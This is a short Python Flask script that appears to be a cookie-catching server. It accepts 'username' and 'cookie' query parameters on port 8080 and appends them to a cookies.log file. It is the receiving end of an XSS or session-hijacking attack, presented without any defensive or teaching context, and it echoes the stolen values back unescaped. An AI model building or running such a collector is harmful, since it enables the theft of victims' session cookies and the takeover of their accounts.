from datetime import datetime
from flask import Flask, request
app = Flask(__name__)

def log(username, cookie):
    log_file = open("cookies.log", "a")
    log_file.write("%s %s\n" % (username, cookie))
    log_file.close()

@app.route('/', methods=['GET'])
def root():
    username = request.args.get('username')
    cookie = request.args.get('cookie')
    if username and cookie:
        log(username, cookie)
        response = "Received username=%s cookie=%s" % (username, cookie)
    else:
        response = "Did not receieve username and cookie params"
    return response

if __name__ == '__main__':
    log("New Session Started:", datetime.now())
    app.run(host='0.0.0.0', port=8080)